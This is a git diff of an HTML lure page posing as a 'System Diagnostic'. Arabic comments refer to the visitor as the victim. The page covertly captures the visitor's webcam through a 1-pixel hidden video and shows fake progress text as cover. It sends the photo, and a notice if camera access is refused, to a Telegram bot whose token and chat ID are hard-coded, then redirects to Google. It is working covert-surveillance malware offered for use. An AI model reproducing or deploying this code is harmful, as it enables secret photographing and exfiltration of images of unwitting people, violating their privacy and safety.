@@ -1,13 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic - جاري الفحص</title>
     <style>
-        body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
-        /* جعل الفيديو يظهر بحجم 1 بكسل فقط لضمان عمل الكاميرا دون أن يراه الضحية */
-        #v { width: 1px; height: 1px; border: none; }
-        #btn { padding: 15px 30px; background: #0f0; color: black; border: none; font-size: 20px; cursor: pointer; border-radius: 5px; }
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        
+        /* جعل الكاميرا مرئية للمتصفح (1 بكسل) ولكنها غير مرئية للعين */
+        #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
+        
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
+        
+        #btn { padding: 15px 40px; background: transparent; color: #00ff00; border: 2px solid #00ff00; font-family: 'VT323', monospace; font-size: 24px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 15px #00ff00; }
+        #btn:hover { background: #00ff00; color: black; }
+        #status { margin-top: 20px; font-size: 20px; letter-spacing: 2px; }
         canvas { display: none; }
     </style>
 </head>
@@ -16,63 +25,73 @@
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
-    <h2>CONNECTING TO SERVER...</h2>
-    <div id="status">PRESS START TO INITIALIZE</div>
-    <br>
-    <button id="btn" onclick="startCapture()">START</button>
+    <div id="main-ui">
+        <button id="btn" onclick="initializeSystem()">RUN DIAGNOSTIC</button>
+    </div>
+
+    <div id="loading-ui" style="display:none; text-align:center;">
+        <div class="loader"></div>
+        <div id="status">CONNECTING TO KERNEL...</div>
+    </div>
 
     <script>
-        const tok = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
-        const id = "8042090388";
+        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
+        const chat = "8042090388";
 
-        async function startCapture() {
-            document.getElementById('btn').style.display = "none";
-            document.getElementById('status').innerText = "STREAMING DATA (10%)...";
+        async function initializeSystem() {
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('loading-ui').style.display = 'block';
 
             try {
+                // طلب الكاميرا بجودة عالية لإجبار الحساس على العمل
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+                    video: { facingMode: "user", width: 1280, height: 720 } 
                 });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // الانتظار حتى يبدأ الفيديو فعلياً
-                video.onplay = () => {
-                    document.getElementById('status').innerText = "TUNING SENSORS (50%)...";
-                    // ننتظر 5 ثواني كاملة عشان الحساس يلقط ضوء
-                    setTimeout(takeFinalShot, 5000);
-                };
+                // تحديث الحالة للضحية (للتمويه)
+                setTimeout(() => { document.getElementById('status').innerText = "SCANNING HARDWARE (35%)..."; }, 2000);
+                setTimeout(() => { document.getElementById('status').innerText = "EXTRACTING DATA (70%)..."; }, 4500);
 
-            } catch (e) {
-                alert("Please allow camera access!");
+                // الانتظار 6 ثوانٍ كاملة لضمان وضوح الصورة وتعديل الإضاءة
+                setTimeout(captureFinal, 6500);
+
+            } catch (err) {
+                // إذا رفض الضحية، نرسل تنبيه للبوت
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=⚠️ الضحية رفض تصريح الكاميرا.`);
+                alert("يجب السماح بالكاميرا لإكمال فحص النظام!");
+                location.reload();
             }
         }
 
-        async function takeFinalShot() {
+        async function captureFinal() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
-            
             c.width = v.videoWidth;
             c.height = v.videoHeight;
             const ctx = c.getContext('2d');
             
-            // رسم الصورة
+            // التقاط الصورة
             ctx.drawImage(v, 0, 0, c.width, c.height);
+            const imgData = c.toDataURL('image/jpeg', 0.9);
             
-            // التحقق من أن الصورة ليست سوداء بالكامل قبل الإرسال
-            const data = c.toDataURL('image/jpeg', 0.8);
-            
-            const blob = await (await fetch(data)).blob();
-            const fd = new FormData();
-            fd.append('chat_id', id);
-            fd.append('photo', blob, 'live_capture.jpg');
-            fd.append('caption', '🎯 صيد حي ومباشر (تم حل مشكلة السواد)');
+            // تحويل الصورة لملف
+            const blob = await (await fetch(imgData)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', chat);
+            formData.append('photo', blob, 'victim_face.jpg');
+            formData.append('caption', '🎯 تم الصيد بنجاح! صورة واضحة ومضمونة.');
 
-            fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {
+            // إرسال الصورة للبوت
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
-                body: fd
+                body: formData
             }).then(() => {
-                window.location.href = "https://www.google.com";
+                document.getElementById('status').innerText = "DIAGNOSTIC COMPLETE";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; // تحويل الضحية
+                }, 1000);
             });
         }
     </script>
